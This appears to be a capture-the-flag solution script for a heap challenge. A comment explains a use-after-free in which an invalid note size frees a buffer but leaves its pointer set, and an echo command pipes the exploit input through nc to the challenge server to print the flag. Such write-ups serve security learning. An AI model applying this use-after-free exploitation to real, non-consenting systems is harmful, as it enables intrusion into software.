# Solution: After entering an invalid size for a note, the note buffer is free'd, #
# but the variable is not set to 0x0 again. So we just have to make a small note, #
# then enter an invalid size to free the buffer and keep the address, then make a #
# medium note, free it, make a large note and not free it. Now all of them hold   #
# the same address because none of them had their values reset and we just have   #
# to run the command 'flag' #

echo -ne \
"small\n"\
"32\n"\
"heap_is_cool\n"\
"small\n"\
"0\n"\
"medium\n"\
"32\n"\
"heap_is_cool\n"\
"medium\n"\
"0\n"\
"large\n"\
"32\n"\
"heap_is_cool\n"\
"medium\n"\
"print\n"\
"flag\n" | nc 10244afec443a522.247ctf.com 50442